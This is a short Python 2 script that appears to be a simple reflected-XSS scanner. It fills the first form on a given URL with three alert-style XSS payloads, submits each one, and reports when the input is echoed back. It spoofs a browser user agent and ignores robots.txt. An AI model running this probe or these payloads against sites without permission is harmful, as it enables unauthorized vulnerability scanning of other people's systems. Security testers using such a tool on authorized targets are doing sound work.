import mechanize
import argparse

sr = argparse.ArgumentParser()
sr.add_argument('-u', dest='url', action='store', help='The URL to analyze')
results = sr.parse_args()

moilla = mechanize.Browser()
moilla.addheaders = [('User-agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11')]
moilla.set_handle_robots(False)
moilla.set_handle_refresh(False)

back = ['.png', '.jpg', '.jpeg', '.mp3', '.mp4', '.avi', '.gif', '.svg', '.pdf']
XSSpay = ['<svg "ons>', '"onfocus="alert(1);', 'javascript:alert(1)']

class color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'

xssurl = results.url
if not xssurl:
    print color.RED + """NOT URL"""
else:
    try:
        abc = 0
        for ba in back:
            if ba in xssurl:
                print color.RED + """Not a good url to test"""
                abc = 1
        if abc == 0:
            moilla.open(xssurl)
            if moilla.forms():
                params = list(moilla.forms())[0]
                moilla.select_form(nr=0)
                for p in params.controls:
                    par = str(p)
                    for item in XSSpay:
                        moilla.form[str(p.name)] = item
                        moilla.submit()
                        print("3")
                        if item in moilla.response().read():
                            print color.GREEN + """XSS found"""
                            print color.GREEN + """Xsspay:""" + xssurl + item
                            abc = 1
                    if abc == 0:
                        print color.YELLOW + """Not XSS"""
    except:
        print "error"
        pass
